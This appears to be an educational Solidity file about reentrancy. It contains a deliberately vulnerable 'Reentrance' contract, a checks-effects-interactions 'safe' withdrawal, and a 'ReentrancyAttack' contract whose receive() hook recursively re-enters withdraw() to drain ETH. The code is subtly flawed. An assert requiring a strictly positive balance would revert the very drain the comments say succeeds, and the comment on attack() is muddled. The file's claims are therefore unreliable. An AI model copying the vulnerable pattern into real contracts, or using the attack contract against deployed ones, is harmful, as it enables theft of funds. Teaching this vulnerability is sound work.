// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

/**
 * @title Reentrance
 * @notice Demonstrates a classic reentrancy vulnerability using the incorrect ordering of external calls
 * and a corrected, safe version using the Checks-Effects-Interactions pattern.
 */
contract Reentrance {
    // Balances mapped by address — note this is signed int256 (unusual), allowing negative values
    mapping(address => int256) public balances;

    /**
     * @notice Accepts ETH and credits the recipient’s balance.
     * @param _to The address whose balance should be increased.
     */
    function donate(address _to) public payable {
        // Adds msg.value (positive) to _to’s balance
        balances[_to] = balances[_to] + int256(msg.value);
    }

    /**
     * @notice Returns the balance of a given address.
     */
    function balanceOf(address _who) public view returns (int256 balance) {
        return balances[_who];
    }

    /**
     * @notice Vulnerable withdraw function.
     * Calls out to msg.sender *before* updating state (balances),
     * allowing reentrant calls to drain funds.
     */
    function withdraw(int256 _amount) public {
        // 1. Check: Ensure the user has enough balance
        if (balances[msg.sender] >= _amount) {
            // 2. Interaction (DANGEROUS): External call made BEFORE state is updated
            (bool result, ) = msg.sender.call{value: uint256(_amount)}(""); // UNCHECKED
            if (result) {
                _amount; // Just an example...
            }

            // 3. Effect: State is updated AFTER the external call (too late)
            balances[msg.sender] -= _amount;
        }

        // Redundant assert, can trigger if balance becomes negative (possible with int256 underflow)
        assert(balances[msg.sender] > 0);
    }

    /**
     * @notice Secure withdraw function.
     * Uses Checks-Effects-Interactions pattern to prevent reentrancy.
     */
    function withdrawSafe(int256 _amount) public {
        // 1. Check: Confirm sufficient balance
        if (balances[msg.sender] >= _amount) {
            // 2. Effect: Update state BEFORE interacting with external addresses
            balances[msg.sender] -= _amount;

            // 3. Interaction: Transfer ETH to the caller
            (bool result, ) = msg.sender.call{value: uint256(_amount)}("");
            if (result) {
                _amount; // Just an example...
            }
        }
    }

    // Allow the contract to receive ETH directly
    receive() external payable {}
}

/**
 * @title ReentrancyAttack
 * @notice A malicious contract designed to exploit vulnerable withdraw functions
 * by recursively calling back into the target contract before state changes are finalised.
 */
contract ReentrancyAttack {
    Reentrance public reentrance;
    int256 public amountToWithdraw;

    constructor(address payable _reentrance, int256 _amountToWithdraw) {
        reentrance = Reentrance(_reentrance);
        amountToWithdraw = _amountToWithdraw;
    }

    /**
     * @notice Initiates the first withdrawal — intended to kickstart reentrancy.
     * Calls the *safe* function, which *prevents* reentrancy — so attack will fail.
     */
    function attack() external {
        reentrance.withdrawSafe(amountToWithdraw); // Calls secure version; won't succeed
    }

    /**
     * @notice Initiates a reentrancy attack using the vulnerable withdraw() function.
     * This will succeed in recursively withdrawing funds before state is updated.
     */
    function attackVulnerable() external {
        reentrance.withdraw(amountToWithdraw); // Call the vulnerable version
    }

    /**
     * @notice Reentrancy hook. Automatically triggered when ETH is received.
     * If the target contract still has enough balance, re-enter to withdraw more.
     */
    receive() external payable {
        // Keep draining if target still holds enough ETH
        if (address(reentrance).balance >= uint256(amountToWithdraw)) {
            // Recursive reentry — only works if target has vulnerable logic
            reentrance.withdraw(amountToWithdraw); // Reentrant call to drain again
        }
    }
}
